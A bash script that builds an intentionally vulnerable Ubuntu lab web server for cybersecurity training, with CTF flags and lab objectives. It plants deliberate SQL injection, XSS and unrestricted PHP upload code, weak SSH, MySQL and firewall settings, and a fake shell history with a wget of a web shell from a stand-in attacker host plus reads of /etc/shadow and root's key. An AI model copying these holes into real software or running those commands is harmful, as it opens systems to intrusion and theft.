#!/usr/bin/env bash
# =============================================================================
# Build-UbuntuWebServer.sh
# SCPS CyberLab — Base Image Builder
# Image  : ubuntu-server-22.04-web
# Purpose: Intentionally vulnerable Linux web server target (Labs 1, 3)
# Host path (Hyper-V): C:\CyberLab\Templates\ubuntu-server-22.04-web.vhdx
# WARNING: This image is INTENTIONALLY INSECURE by design for teaching purposes.
#          NEVER deploy on production or internet-facing infrastructure.
# Run inside the VM after Ubuntu Server 22.04 LTS minimal installation.
# =============================================================================

set -euo pipefail

# =============================================================================
# CONSTANTS
# =============================================================================
LOGFILE="/var/log/lab-build.log"
CREDENTIALS_FILE="/root/.lab-credentials"
BUILD_TIMESTAMP="$(date '+%Y-%m-%d %H:%M:%S')"
IMAGE_NAME="ubuntu-server-22.04-web"
WEB_ROOT="/var/www/html"
FLAGS_DIR="/root/flags"

# =============================================================================
# COLOR OUTPUT FUNCTIONS
# =============================================================================
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
BOLD='\033[1m'
RESET='\033[0m'

info()    { echo -e "${BLUE}[INFO]${RESET}  $*" | tee -a "$LOGFILE"; }
warn()    { echo -e "${YELLOW}[WARN]${RESET}  $*" | tee -a "$LOGFILE"; }
error()   { echo -e "${RED}[ERROR]${RESET} $*" | tee -a "$LOGFILE"; exit 1; }
success() { echo -e "${GREEN}[OK]${RESET}    $*" | tee -a "$LOGFILE"; }
section() { echo -e "\n${BOLD}${CYAN}=== $* ===${RESET}" | tee -a "$LOGFILE"; }

# =============================================================================
# PREREQUISITE CHECK
# =============================================================================
[[ $EUID -ne 0 ]] && error "This script must be run as root."

touch "$LOGFILE"
chmod 600 "$LOGFILE"
touch "$CREDENTIALS_FILE"
chmod 600 "$CREDENTIALS_FILE"

exec > >(tee -a "$LOGFILE") 2>&1

info "Build started: $BUILD_TIMESTAMP"
info "Image: $IMAGE_NAME"

# =============================================================================
# PASSWORD GENERATION
# =============================================================================
generate_password() {
    tr -dc 'A-Za-z0-9!@#$%' </dev/urandom | head -c 20
}

WEBADMIN_PASS="$(generate_password)"
DVWA_DB_PASS="$(generate_password)"
MYSQL_ROOT_PASS="$(generate_password)"

cat >> "$CREDENTIALS_FILE" <<EOF

# ============================================================
# $IMAGE_NAME  —  built $BUILD_TIMESTAMP
# ============================================================
WEBADMIN_USER=webadmin
WEBADMIN_PASS=$WEBADMIN_PASS
MYSQL_ROOT_PASS=$MYSQL_ROOT_PASS
DVWA_DB_USER=dvwa
DVWA_DB_PASS=$DVWA_DB_PASS
# NOTE: This is an intentionally vulnerable image.
# Root SSH login is ENABLED by design for lab teaching.
EOF

success "Credentials file initialised."

# =============================================================================
# SECTION 1: SYSTEM UPDATE
# =============================================================================
section "System Update"

export DEBIAN_FRONTEND=noninteractive

apt-get update -y
apt-get upgrade -y \
    -o Dpkg::Options::="--force-confdef" \
    -o Dpkg::Options::="--force-confold"
apt-get autoremove -y
apt-get autoclean -y

success "System updated."

# =============================================================================
# SECTION 2: PACKAGE INSTALLATION
# =============================================================================
section "Package Installation"

info "Installing LAMP stack and tools..."
apt-get install -y \
    apache2 \
    php8.1 \
    php8.1-mysql \
    php8.1-gd \
    php8.1-curl \
    php8.1-xml \
    php8.1-mbstring \
    mysql-server \
    git \
    curl \
    wget \
    python3 \
    python3-pip \
    unzip \
    net-tools \
    vim \
    fail2ban

success "Packages installed."

# =============================================================================
# SECTION 3: HYPER-V INTEGRATION SERVICES
# =============================================================================
section "Hyper-V Integration Services"

info "Installing Hyper-V integration tools..."
apt-get install -y \
    linux-cloud-tools-virtual \
    linux-tools-virtual \
    linux-azure || \
    apt-get install -y linux-tools-generic linux-cloud-tools-generic || \
    warn "Some Hyper-V tools may not be available for this kernel."

for mod in hv_vmbus hv_storvsc hv_blkvsc hv_netvsc hv_utils hv_balloon; do
    modprobe "$mod" 2>/dev/null || true
done

cat > /etc/modules-load.d/hyperv.conf <<'EOF'
hv_vmbus
hv_storvsc
hv_blkvsc
hv_netvsc
hv_utils
hv_balloon
EOF

success "Hyper-V integration configured."

# =============================================================================
# SECTION 4: MYSQL CONFIGURATION
# =============================================================================
section "MySQL Configuration"

info "Starting MySQL service..."
systemctl start mysql
systemctl enable mysql

info "Securing MySQL and creating DVWA database..."
mysql -u root <<SQLEOF
-- Set root password
ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY '${MYSQL_ROOT_PASS}';
FLUSH PRIVILEGES;

-- Create DVWA database and user
CREATE DATABASE IF NOT EXISTS dvwa;
CREATE USER IF NOT EXISTS 'dvwa'@'localhost' IDENTIFIED BY '${DVWA_DB_PASS}';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'localhost';

-- Intentional vulnerability: also grant from any host (lab teaching point)
CREATE USER IF NOT EXISTS 'dvwa'@'%' IDENTIFIED BY '${DVWA_DB_PASS}';
GRANT ALL PRIVILEGES ON dvwa.* TO 'dvwa'@'%';

FLUSH PRIVILEGES;
SQLEOF

# Intentionally expose MySQL on all interfaces (teaching vulnerability)
sed -i 's/^bind-address\s*=.*/bind-address = 0.0.0.0/' \
    /etc/mysql/mysql.conf.d/mysqld.cnf

systemctl restart mysql
success "MySQL configured."

# =============================================================================
# SECTION 5: APACHE CONFIGURATION
# =============================================================================
section "Apache Configuration"

info "Enabling Apache modules..."
a2enmod rewrite headers php8.1 2>/dev/null || true

# Intentionally verbose logging for teaching
cat > /etc/apache2/conf-available/lab-settings.conf <<'APACHECONF'
# SCPS CyberLab — Intentionally verbose/weak Apache settings for teaching
ServerTokens Full
ServerSignature On
TraceEnable On
LogLevel info

# Disable clickjacking protection (intentional vuln)
Header always unset X-Frame-Options
Header always unset X-Content-Type-Options
Header always unset X-XSS-Protection
APACHECONF

a2enconf lab-settings 2>/dev/null || true

# Allow overrides in web root
cat > /etc/apache2/sites-available/000-default.conf <<'VHOST'
<VirtualHost *:80>
    ServerAdmin webmaster@localhost
    DocumentRoot /var/www/html

    <Directory /var/www/html>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
VHOST

systemctl enable apache2
systemctl restart apache2
success "Apache configured."

# =============================================================================
# SECTION 6: DEPLOY DVWA
# =============================================================================
section "DVWA Deployment"

DVWA_DIR="${WEB_ROOT}/dvwa"

if [[ -d "$DVWA_DIR" ]]; then
    info "DVWA directory exists, pulling latest..."
    git -C "$DVWA_DIR" pull 2>/dev/null || true
else
    info "Cloning DVWA from GitHub..."
    git clone https://github.com/digininja/DVWA "$DVWA_DIR"
fi

# Configure DVWA
DVWA_CONFIG="${DVWA_DIR}/config/config.inc.php"
cp "${DVWA_DIR}/config/config.inc.php.dist" "$DVWA_CONFIG"

sed -i "s/\$_DVWA\[ 'db_password' \] = .*/\$_DVWA[ 'db_password' ] = '${DVWA_DB_PASS}';/" "$DVWA_CONFIG"
sed -i "s/\$_DVWA\[ 'db_user' \] = .*/\$_DVWA[ 'db_user' ] = 'dvwa';/" "$DVWA_CONFIG"
sed -i "s/\$_DVWA\[ 'db_database' \] = .*/\$_DVWA[ 'db_database' ] = 'dvwa';/" "$DVWA_CONFIG"
# Set default security level to low
sed -i "s/\$_DVWA\[ 'default_security_level' \] = .*/\$_DVWA[ 'default_security_level' ] = 'low';/" "$DVWA_CONFIG"

# reCAPTCHA keys — blank for lab (bypass intentional)
sed -i "s/\$_DVWA\[ 'recaptcha_public_key' \] = .*/\$_DVWA[ 'recaptcha_public_key' ] = '';/" "$DVWA_CONFIG"
sed -i "s/\$_DVWA\[ 'recaptcha_private_key' \] = .*/\$_DVWA[ 'recaptcha_private_key' ] = '';/" "$DVWA_CONFIG"

# Fix PHP settings for DVWA
PHP_INI="/etc/php/8.1/apache2/php.ini"
sed -i 's/^allow_url_include = .*/allow_url_include = On/' "$PHP_INI"
sed -i 's/^display_errors = .*/display_errors = On/' "$PHP_INI"
sed -i 's/^allow_url_fopen = .*/allow_url_fopen = On/' "$PHP_INI"

# Set permissions
chown -R www-data:www-data "$DVWA_DIR"
chmod -R 755 "$DVWA_DIR"
chmod 777 "${DVWA_DIR}/hackable/uploads/"
chmod 777 "${DVWA_DIR}/config/"
chmod 666 "${DVWA_DIR}/external/phpids/0.6/lib/IDS/tmp/phpids_log.txt" 2>/dev/null || true

success "DVWA deployed."

# =============================================================================
# SECTION 7: CUSTOM VULNERABLE PHP APPLICATION
# =============================================================================
section "Custom Vulnerable PHP Application"

info "Deploying custom vulnerable PHP page at index.php..."
cat > "${WEB_ROOT}/index.php" <<'PHPEOF'
<?php
/**
 * SCPS CyberLab — Intentionally Vulnerable Web App
 * WARNING: This page contains deliberate SQL injection and file upload
 * vulnerabilities for teaching purposes ONLY.
 * DO NOT deploy this on any production or internet-facing system.
 */

// ---- Database connection (credentials in plaintext — intentional) ----
$db_host = 'localhost';
$db_user = 'dvwa';
$db_pass = 'DB_PASSWORD_PLACEHOLDER';  // replaced by sed below
$db_name = 'dvwa';

// ---- VULNERABILITY 1: SQL Injection ----
// No prepared statements, direct user input in query
if (isset($_GET['id'])) {
    $id = $_GET['id'];  // No sanitisation
    $conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
    if (!$conn->connect_error) {
        $query = "SELECT * FROM users WHERE user_id = $id";  // SQLi here
        $result = $conn->query($query);
        echo "<h2>User Results</h2><pre>";
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                echo htmlspecialchars(print_r($row, true));
            }
        } else {
            echo "Error: " . $conn->error;  // Verbose error disclosure
        }
        echo "</pre>";
        $conn->close();
    }
}

// ---- VULNERABILITY 2: Reflected XSS ----
if (isset($_GET['search'])) {
    $search = $_GET['search'];  // No sanitisation
    echo "<h2>Search results for: $search</h2>";  // XSS here
}

// ---- VULNERABILITY 3: File Upload (no type checking) ----
$upload_dir = '/var/www/html/uploads/';
if (!is_dir($upload_dir)) { mkdir($upload_dir, 0777, true); }
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload'])) {
    $filename = $_FILES['upload']['name'];  // No validation
    $dest = $upload_dir . $filename;
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        echo "<p style='color:green'>Uploaded: <a href='/uploads/$filename'>$filename</a></p>";
    }
}
?>
<!DOCTYPE html>
<html>
<head><title>SCPS Lab Server</title></head>
<body>
<h1>SCPS CyberLab Web Server</h1>
<p><a href="/dvwa">DVWA</a> | <a href="/secret/">Secret Directory</a></p>
<hr/>
<h3>User Lookup (id=1)</h3>
<form method="GET"><input name="id" placeholder="User ID"/><button>Lookup</button></form>
<h3>Search</h3>
<form method="GET"><input name="search" placeholder="Search term"/><button>Search</button></form>
<h3>File Upload</h3>
<form method="POST" enctype="multipart/form-data">
<input type="file" name="upload"/><button>Upload</button>
</form>
<!-- DEBUG: Admin panel at /admin/panel.php | Config backup at /config.bak -->
<!-- TODO: remove before prod - DB_PASSWORD_PLACEHOLDER -->
</body>
</html>
PHPEOF

# Replace DB password placeholder in the PHP file
sed -i "s/DB_PASSWORD_PLACEHOLDER/${DVWA_DB_PASS}/g" "${WEB_ROOT}/index.php"

# Create uploads directory (world-writable — intentional vulnerability)
mkdir -p "${WEB_ROOT}/uploads"
chmod 777 "${WEB_ROOT}/uploads"

# Create a .htaccess that allows PHP in uploads (intentional vuln)
cat > "${WEB_ROOT}/uploads/.htaccess" <<'HTEOF'
# Intentionally insecure — allows PHP execution in uploads (teaching vuln)
php_flag engine on
HTEOF

success "Custom vulnerable PHP app deployed."

# =============================================================================
# SECTION 8: SECRET DIRECTORY AND FLAG FILES
# =============================================================================
section "Secret Directory and Flag Files"

SECRET_DIR="${WEB_ROOT}/secret"
mkdir -p "$SECRET_DIR"

cat > "${SECRET_DIR}/flag1.txt" <<'FLAG'
SCPS{w3b_3num3r4t10n_f1nd5_h1dd3n_d1rs}
Congratulations! You found the secret directory via directory enumeration.
Next objective: exploit the SQL injection in index.php to dump credentials.
FLAG

cat > "${SECRET_DIR}/config.bak" <<EOF
# Old config backup — intentionally left here as a misconfiguration
DB_HOST=localhost
DB_USER=dvwa
DB_PASS=${DVWA_DB_PASS}
DB_NAME=dvwa
ADMIN_TOKEN=SCPS{c0nf1g_b4ckup_l34k3d_s3cr3ts}
EOF

cat > "${SECRET_DIR}/index.html" <<'HTML'
<!DOCTYPE html>
<html><body>
<h1>403 Forbidden</h1>
<!-- Nothing to see here... or is there? Try: flag1.txt, config.bak -->
</body></html>
HTML

chmod 755 "$SECRET_DIR"
chmod 644 "${SECRET_DIR}"/*
chown -R www-data:www-data "$SECRET_DIR"

# Root flags directory
mkdir -p "$FLAGS_DIR"
chmod 700 "$FLAGS_DIR"

cat > "${FLAGS_DIR}/root_flag.txt" <<'RFLAG'
SCPS{r00t_pr1v3sc_0wn3d_th3_w3bs3rv3r}
You have achieved root access on the web server!
This flag confirms full system compromise.
RFLAG

cat > "${FLAGS_DIR}/objectives.txt" <<'ROBJ'
Lab Objectives (Web Server):
1. [ ] Perform service enumeration (nmap scan)
2. [ ] Discover /secret/ via directory brute-force
3. [ ] Exploit SQL injection in index.php to dump user table
4. [ ] Upload a PHP web shell via the file upload vulnerability
5. [ ] Achieve Remote Code Execution
6. [ ] Escalate privileges to root
7. [ ] Capture root_flag.txt
ROBJ

success "Flag files created."

# =============================================================================
# SECTION 9: INTENTIONALLY WEAK SSH CONFIGURATION
# =============================================================================
section "SSH Configuration (Intentionally Weak — Lab Target)"

# WARNING: The following SSH config is INTENTIONALLY INSECURE.
# Root login and password authentication are enabled by design
# to simulate a misconfigured production server for teaching.

apt-get install -y openssh-server
systemctl enable ssh

cat > /etc/ssh/sshd_config <<'SSHEOF'
# SCPS CyberLab — INTENTIONALLY VULNERABLE SSH CONFIG
# Root login and password auth enabled for lab teaching purposes.
# DO NOT use this configuration in production.

Port 22
Protocol 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key

# INTENTIONAL MISCONFIGURATIONS (teaching vulnerabilities)
PermitRootLogin yes
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no
UsePAM yes

# No banner (intentional — teaches students to check for banners)
# Banner none

# Verbose logging for blue team teaching
LogLevel VERBOSE
SyslogFacility AUTH

# Allow TCP forwarding (pivot point — intentional)
AllowTcpForwarding yes
GatewayPorts yes

Subsystem sftp /usr/lib/openssh/sftp-server
SSHEOF

systemctl restart ssh
success "SSH configured (intentionally weak for lab target)."

# =============================================================================
# SECTION 10: INTERESTING .bash_history (Teaching Artifact)
# =============================================================================
section "Planting Interesting Shell History"

cat > /home/webadmin/.bash_history <<'HIST'
ssh root@10.0.0.1 -i ~/.ssh/id_rsa
mysql -u root -p
mysql -u dvwa -p dvwa
cat /etc/passwd
cat /etc/shadow
find / -perm -4000 2>/dev/null
wget http://attacker.example.com/shell.php -O /var/www/html/shell.php
sudo su
cat /root/.ssh/id_rsa
crontab -e
git clone https://github.com/digininja/DVWA /var/www/html/dvwa
service apache2 restart
curl -s http://internal-api.lab/admin/token
HIST

# Generate a self-signed SSH key for root (teaching artifact — leaked key)
if [[ ! -f /root/.ssh/id_rsa ]]; then
    mkdir -p /root/.ssh
    chmod 700 /root/.ssh
    ssh-keygen -t rsa -b 2048 -f /root/.ssh/id_rsa -N "" \
        -C "root@webserver-lab (SCPS CyberLab self-signed)" 2>/dev/null
    # Copy public key to authorized_keys (common misconfiguration)
    cat /root/.ssh/id_rsa.pub >> /root/.ssh/authorized_keys
    chmod 600 /root/.ssh/authorized_keys
fi

success "Interesting artifacts planted."

# =============================================================================
# SECTION 11: USER ACCOUNTS
# =============================================================================
section "User Accounts"

# webadmin — sudo user
if ! id webadmin &>/dev/null; then
    useradd -m -s /bin/bash -c "Web Administrator" webadmin
fi
echo "webadmin:${WEBADMIN_PASS}" | chpasswd
usermod -aG sudo webadmin

success "User accounts configured."

# =============================================================================
# SECTION 12: FAIL2BAN (INTENTIONALLY MISCONFIGURED)
# =============================================================================
section "Fail2ban (Intentionally Disabled)"

# Installed but not running — teaches students that presence != active protection
systemctl disable fail2ban 2>/dev/null || true
systemctl stop fail2ban 2>/dev/null || true

# Create a dummy config that looks active but does nothing
cat > /etc/fail2ban/jail.local <<'F2BEOF'
# SCPS CyberLab — fail2ban intentionally misconfigured
# This service is disabled. Students should detect this via enumeration.
[DEFAULT]
bantime = 0
findtime = 99999
maxretry = 99999

[sshd]
enabled = false
F2BEOF

warn "fail2ban installed but intentionally DISABLED (lab teaching point)."

# =============================================================================
# SECTION 13: FIREWALL (iptables — Intentionally Permissive)
# =============================================================================
section "Firewall (Intentionally Permissive for Lab)"

apt-get install -y iptables iptables-persistent

# Flush existing rules
iptables -F
iptables -X
iptables -Z

# Default policy: allow all (intentional — students should detect this)
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

# Allow loopback
iptables -A INPUT -i lo -j ACCEPT

# Allow established connections
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Intentionally allow all relevant ports including MySQL externally
iptables -A INPUT -p tcp --dport 22   -j ACCEPT  # SSH
iptables -A INPUT -p tcp --dport 80   -j ACCEPT  # HTTP
iptables -A INPUT -p tcp --dport 443  -j ACCEPT  # HTTPS
iptables -A INPUT -p tcp --dport 8080 -j ACCEPT  # Alt HTTP
iptables -A INPUT -p tcp --dport 3306 -j ACCEPT  # MySQL — INTENTIONALLY EXPOSED

# Save rules
netfilter-persistent save 2>/dev/null || iptables-save > /etc/iptables/rules.v4

warn "MySQL (3306) intentionally exposed on all interfaces — lab teaching point."
success "Firewall configured (permissive for lab target)."

# =============================================================================
# SECTION 14: MOTD
# =============================================================================
section "MOTD"

cat > /etc/motd <<'MOTD'

  SCPS CyberLab — Ubuntu Web Server (ubuntu-server-22.04-web)
  Role  : Intentionally Vulnerable Web Target (Labs 1, 3)

  WARNING: This system is intentionally insecure.
           It is a controlled lab environment for cybersecurity training.

  Services: Apache (80), MySQL (3306), SSH (22)
  Apps    : DVWA at http://<IP>/dvwa
            Custom app at http://<IP>/

MOTD

# =============================================================================
# SECTION 15: SYSPREP
# =============================================================================
section "Sysprep — Generalising Image"

info "Clearing bash history..."
history -c 2>/dev/null || true
cat /dev/null > /root/.bash_history
# Intentionally leave webadmin history (planted artifact — only clear at reset)
# DO NOT clear /home/webadmin/.bash_history — it's a planted teaching artifact

info "Removing SSH host keys (regenerated on first boot)..."
rm -f /etc/ssh/ssh_host_*

cat > /etc/systemd/system/ssh-keygen-firstboot.service <<'SVCEOF'
[Unit]
Description=Regenerate SSH host keys on first boot
Before=ssh.service
ConditionPathExists=!/etc/ssh/ssh_host_rsa_key

[Service]
Type=oneshot
ExecStart=/usr/sbin/dpkg-reconfigure openssh-server
ExecStartPost=/bin/systemctl restart ssh

[Install]
WantedBy=multi-user.target
SVCEOF
systemctl enable ssh-keygen-firstboot.service

info "Clearing machine-id..."
truncate -s 0 /etc/machine-id
rm -f /var/lib/dbus/machine-id
ln -sf /etc/machine-id /var/lib/dbus/machine-id

info "Truncating logs (preserving planted history)..."
find /var/log -type f -name "*.log" -exec truncate -s 0 {} \; 2>/dev/null || true
journalctl --rotate 2>/dev/null || true
journalctl --vacuum-time=1s 2>/dev/null || true

apt-get clean
rm -rf /tmp/* /var/tmp/* 2>/dev/null || true

info "Zeroing free space..."
dd if=/dev/zero of=/zero.fill bs=1M status=progress 2>/dev/null || true
sync
rm -f /zero.fill
sync

success "Sysprep complete."

# =============================================================================
# FINAL SUMMARY
# =============================================================================
section "Build Complete — Credential Summary"

echo ""
echo -e "${BOLD}${GREEN}╔══════════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}${GREEN}║         SCPS CyberLab — $IMAGE_NAME          ║${RESET}"
echo -e "${BOLD}${GREEN}╚══════════════════════════════════════════════════════╝${RESET}"
echo ""
echo -e "  ${BOLD}webadmin password   :${RESET} $WEBADMIN_PASS"
echo -e "  ${BOLD}MySQL root password :${RESET} $MYSQL_ROOT_PASS"
echo -e "  ${BOLD}DVWA DB password    :${RESET} $DVWA_DB_PASS"
echo ""
echo -e "  ${YELLOW}Intentional vulnerabilities:${RESET}"
echo -e "    - Root SSH login enabled"
echo -e "    - SSH password auth enabled"
echo -e "    - MySQL exposed on 0.0.0.0:3306"
echo -e "    - PHP allow_url_include=On (RFI)"
echo -e "    - DVWA security level: low"
echo -e "    - fail2ban installed but disabled"
echo ""
echo -e "  Credentials saved to: ${BOLD}$CREDENTIALS_FILE${RESET}"
echo -e "  Build log at        : ${BOLD}$LOGFILE${RESET}"
echo ""
echo -e "${YELLOW}  Hyper-V note: Store completed VHDX at${RESET}"
echo -e "${YELLOW}  C:\\CyberLab\\Templates\\${IMAGE_NAME}.vhdx${RESET}"
echo ""

info "Shutting down in 5 seconds..."
sleep 5
/sbin/poweroff
